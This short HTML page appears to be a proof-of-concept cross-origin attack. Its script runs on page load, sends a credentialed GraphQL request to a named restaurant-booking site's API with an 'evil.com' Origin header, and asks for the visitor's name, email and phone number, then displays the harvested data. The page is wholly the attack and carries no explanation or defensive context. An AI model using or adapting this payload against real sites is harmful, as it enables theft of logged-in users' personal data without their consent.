<html>
  <body>
    <h2>Extracted Data:</h2>
    <pre id="output"></pre>

    <script>
      fetch("https://www.thefork.com/api/graphql", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Origin": "https://evil.com"
        },
        body: JSON.stringify({
          query: "{ user { firstName lastName email phone } }"
        })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
      })
      .catch(err => console.error(err));
    </script>
  </body>
</html>
